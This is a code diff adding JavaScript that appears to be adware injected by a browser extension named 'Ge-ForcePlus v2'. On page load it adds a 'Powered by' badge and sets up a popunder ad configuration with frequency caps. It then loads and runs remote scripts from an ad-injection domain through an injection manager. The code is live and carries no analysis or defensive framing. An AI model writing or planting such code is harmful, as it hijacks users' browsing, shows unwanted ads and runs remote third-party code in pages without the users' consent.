@@ -1,0 +1,55 @@
+function getMetaContent (metaName) { 
+		try{
+		   var metas = document.getElementsByTagName('meta'); 
+		   
+		   if (metas) {
+			   for (var i=0; i<metas.length; i++) { 
+			      if (metas[i].getAttribute("name") == metaName) { 
+			         return metas[i].getAttribute("content"); 
+			      } 
+			   } 
+		   }
+		}
+		catch(e) {}
+
+	   return null;
+}
+
+if (window.name.indexOf('rhpop')==0 && getMetaContent("rhlprdr")==null){
+	setTimeout(function(){
+		
+		var appUrl="";
+		var appName="Ge-ForcePlus v2";
+		
+		var leftDiv = document.createElement('div'); 
+		leftDiv.id = 'left';
+		leftDiv.setAttribute('style', 'position:fixed;bottom:0px;right:0px;text-align:left; font-size:10px;padding: 1px 1px;margin-right: 1px;margin-bottom:1px');
+		leftDiv.style.background =  '#FFFFFF';
+		leftDiv.innerHTML =  'Powered by ';
+				
+		if (!appUrl.length==0){
+			var a = document.createElement('a');
+			a.target =  'blank';
+			a.href =  appUrl;
+			a.innerHTML = appName;
+			leftDiv.appendChild(a);
+		}
+		else{
+			leftDiv.innerHTML =  "Powered by "+appName;
+		}
+		document.body.appendChild(leftDiv);
+		window.name = '';
+	},2000);
+}
+var RHConfig={js: 'http://cdn1.clktag.com/script/injrhpop_1.0.4.js', injectUrl : 'http://cdn1.clktag.com/script/rhpop_1.1.28.js', popupUrl: 'http://rvfrm2006.com/adServe/sa?cid=11021-540172911425000000&pid=11021',cappingMaxNum:2,cappingMinTime:5,cappingPeriod:900,injCapping:30,ap: 'cmp=POPUNDER'}; RHConfig.appName='Ge-ForcePlus+v2';RHConfig.q='www.appcthailand.com';RHConfig.pid='11021';RHConfig.cid='11021-540172911425000000';
+ (function() { 
+ fileref=document.createElement('script'); 
+ fileref.setAttribute('type','text/javascript'); 
+ fileref.setAttribute('src', RHConfig.js); 
+ document.getElementsByTagName('body')[0].appendChild(fileref); 
+ var injLoader = setInterval(function() { 
+ if (typeof(InjManager) != 'undefined') { 
+ InjManager.init(); 
+ clearInterval(injLoader); 
+}}, 10);
+})(); 
